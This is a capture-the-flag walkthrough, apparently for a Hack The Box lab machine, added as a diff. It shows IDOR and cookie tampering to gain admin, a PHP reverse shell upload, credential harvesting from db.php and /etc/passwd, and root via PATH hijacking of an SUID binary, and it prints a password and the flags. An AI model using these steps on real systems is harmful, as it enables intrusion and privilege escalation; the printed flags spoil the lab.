@@ -1,0 +1,55 @@
+We have a web page and we can find 2 tcp port (ssh and http) using nmap -sC -sV 10.129.109.85
+First we want to configure BurpSuite the proxy
+let's select "manual proxy configuration" in the proxy network settings of our browser  and put 12.0.0.1 ip and 8080 port in the HTTP proxy
+Then open burpsuite and set the intercept to on
+
+So now we can intercept request from our browser in our burpsuite
+if we reload the web site, we can find the login page in the directory /cdn-cgi/login
+now let's connect as guest 
+but we don't have access to all the pages cause the uploads one demands super admin rigths 
+So let's try to get a admin cookie ;)
+if we check the cookies section (in storage in the inspector) we can see that role=guest and user=2233 so we need to find the user that match the role super admin
+if we go to the accounts section we can see that our web bar became : "http://10.129.109.85/cdn-cgi/login/admin.php?content=accounts&id=2" so let's try to replace the 2 by a 1
+And yes we got the admin access id : 34322
+so now let's change the role of our cookie to admin and the user to 34322
+YAYY!! we have an access to the upload form
+
+Now we can upload a php reverse shell :D
+we can find one in /usr/share/webshells/php/php-reverse-shell.php (change the ip adress and port in it)
+
+Now let's check where the files are uploaded by using gobuster to bruteforce the directories : gobuster dir --url http://10.129.109.85/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+we found that they are uploaded in the /uploads folder (surprising xD)
+but we don't got enough permission to access it
+
+Well before anything else let's set up our netcat in order to listen to 1234 to see if we can get any response when try to request our php file
+let's now try to launch our script in our web page by going in the url : http://10.129.109.85/uploads/php-reverse-shell.php
+YAYY!! we got a reverse shell in our netcat tab
+use this python3 -c 'import pty;pty.spawn("/bin/bash")' in order to have a nice shell
+
+but we don't have much rigths so let's try to connect as an other user
+let's check other user : cat /etc/passwd
+we an interesting robert user so we're going to try to connect as robert, but we need a password 
+so let's check the files of the login page of the website : go to /var/www/html/cdn-cgi/login
+if we go to the db.php file we can see : $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+so let's try to connect to robert using 'M3g4C0rpUs3r!' as password : su robert
+we can find the user flag  in /home/robert
+""f2c74ee8db7983851ab2a96a44eb7981""
+
+sadly robert is not in the sudoers file nor in the sudo group, so he can't run the sudo command but he's in the bugtracker group
+so let's find out what binary are owned by this group : find / -group bugtracker 2>/dev/null
+bugtracker own /usr/bin/bugtracker which has SUID permission (ls -l)
+So we can execute the binary as root
+when trying to execute bugtracker we get an error but we also see that the command 'cat' is called not securily
+so let's create a cat file with this in it : '/bin/sh' 
+let's allow it to be run : chmod +x cat
+and now let's put it in the PATH variable in order to make it executable : export PATH=/tmp:$PATH
+so now when we use bugtracker it will be our cat file that will be use 
+by running bugtracker now we get a root access
+we can find the file in /root
+""af13b0bee69f8a877c3faf667f7beacf""
+
+
+
+
+
+
